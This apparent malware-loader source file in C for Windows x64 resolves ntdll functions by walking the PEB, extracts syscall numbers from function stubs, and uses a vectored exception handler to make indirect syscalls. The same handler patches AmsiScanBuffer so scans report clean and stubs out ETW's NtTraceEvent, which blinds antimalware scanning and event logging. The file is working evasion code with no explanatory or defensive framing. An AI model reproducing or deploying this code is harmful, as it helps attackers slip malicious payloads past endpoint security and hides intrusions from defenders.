#include <windows.h>
#include <unwin.h>
#include <stdint.h>

#include "../debug/debug.h"
#include "syscalls.h"

#define loop for (;;)

CTX_VSE GlobalVSE;

CTX_VSE InitVSE() {
    DEBUG_INFO("`InitVSE`");
    PPEB peb = NtCurrentPeb();
    PPEB_LDR_DATA ldr               = peb->Ldr;
    PLDR_DATA_TABLE_ENTRY entry     = (PLDR_DATA_TABLE_ENTRY)((PBYTE)ldr->InMemoryOrderModuleList.Flink->Flink - 0x10); // 0x10 to back at begin
    PIMAGE_DOS_HEADER dllPe         = (PIMAGE_DOS_HEADER) entry->DllBase;
    PIMAGE_NT_HEADERS dllPeNt       = (PIMAGE_NT_HEADERS) ((PBYTE)dllPe + dllPe->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY) ((PBYTE)dllPe + dllPeNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    CTX_VSE ctx = { 0, dllPe, exports };
    return ctx;
}

BOOL GetFunctionAddr(CTX_VSE* ctx, char* functionName) {
    DEBUG_INFO("`GetFunctionAddr`");
    PDWORD exportsFuncs    = (PDWORD)( (PBYTE)ctx->Base + ctx->Exports->AddressOfFunctions );
    PDWORD exportsNames    = (PDWORD)( (PBYTE)ctx->Base + ctx->Exports->AddressOfNames );
    PWORD  exportsOrdinals = (PWORD) ( (PBYTE)ctx->Base + ctx->Exports->AddressOfNameOrdinals );

    for (int i = 0; i < ctx->Exports->NumberOfFunctions; i++) {
        char* fname = (char*)( (PBYTE) ctx->Base + exportsNames[i] );
        if ( strcmp(fname, functionName) == 0 ) {
            PVOID faddr = ( (PBYTE)ctx->Base + exportsFuncs[ exportsOrdinals[i] ] );
            DEBUG_INFO("Found %s -> %p", functionName, faddr);
            ctx->SyscallAddr = faddr;
            return TRUE;
        }
    }
    return FALSE;
}

// Return output:     SSN
// Output parameter: ADDR
int GetSyscallAddr(VOID* fSyscallAddr, INT_PTR* outAddr) { 
    DEBUG_INFO("`GetSyscallAddr` on %p (output into %p)", fSyscallAddr, outAddr);

    loop {
        if (
            *((PBYTE)fSyscallAddr) == 0x0f &&
            *((PBYTE)fSyscallAddr + 1) == 0x05
        ) return 0;

        if ( *((PBYTE)fSyscallAddr) == 0xc3 ) return 0;

        if (
            *((PBYTE)fSyscallAddr) == 0x4c &&
            *((PBYTE)fSyscallAddr + 1) == 0x8b &&
            *((PBYTE)fSyscallAddr + 2) == 0xd1 &&
            *((PBYTE)fSyscallAddr + 3) == 0xb8 &&
            *((PBYTE)fSyscallAddr + 6) == 0x00 &&
            *((PBYTE)fSyscallAddr + 7) == 0x00
        ) {
            BYTE low  = *((PBYTE)fSyscallAddr + 4);
            BYTE high = *((PBYTE)fSyscallAddr + 5);

            *outAddr = (INT_PTR)fSyscallAddr + 0x12;

            DEBUG_INFO("SSN Found 0x%x", (high << 8) | low);

            return (high << 8) | low;
        }

        fSyscallAddr = (PBYTE)fSyscallAddr + 1;
    }

    return 0;
}

ULONG CALLBACK SyscallRunnerVEH(PEXCEPTION_POINTERS exception) {
    if (exception->ExceptionRecord->ExceptionCode == EXCEPTION_BREAKPOINT) {
        DEBUG_INFO("Breakpoint detected!");
        INT_PTR syscallAddr;

        int syscallSSN = GetSyscallAddr(GlobalVSE.SyscallAddr, &syscallAddr);
        if (syscallSSN == 0) {
            DEBUG_ERROR("Syscall not found");
            return EXCEPTION_CONTINUE_EXECUTION;
        }

        PCONTEXT context = exception->ContextRecord;

        context->R10 = context->Rcx;
        context->Rax = syscallSSN;
        context->Rip = syscallAddr;
        DEBUG_INFO("R10 = 0x%p", context->Rcx);
        DEBUG_INFO("RAX = 0x%p", syscallSSN);
        DEBUG_INFO("RIP = 0x%p", syscallAddr);
        return EXCEPTION_CONTINUE_EXECUTION;
    } else if (exception->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        PVOID amsiAddress = GetProcAddress(GetModuleHandleA("amsi"), "AmsiScanBuffer");
        PVOID etwAddress = GetProcAddress(GetModuleHandleA("ntdll"), "NtTraceEvent");
        DWORD64 currentAddr = exception->ContextRecord->Rip;

        exception->ContextRecord->Rip = *((uint64_t*)(exception->ContextRecord->Rsp));
        exception->ContextRecord->Rsp += sizeof(PVOID);
        if (currentAddr == (DWORD64)amsiAddress) {
            //
            // Gets 7th parameter in stack and turn to 0
            //
            *(PULONG)(*(PULONG_PTR)(exception->ContextRecord->Rsp + (6 * sizeof(PVOID)))) = 0;

            exception->ContextRecord->Rax = S_OK;
        } else if (currentAddr == (DWORD64)etwAddress) {
            exception->ContextRecord->Rax = STATUS_SUCCESS;
        }

        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}
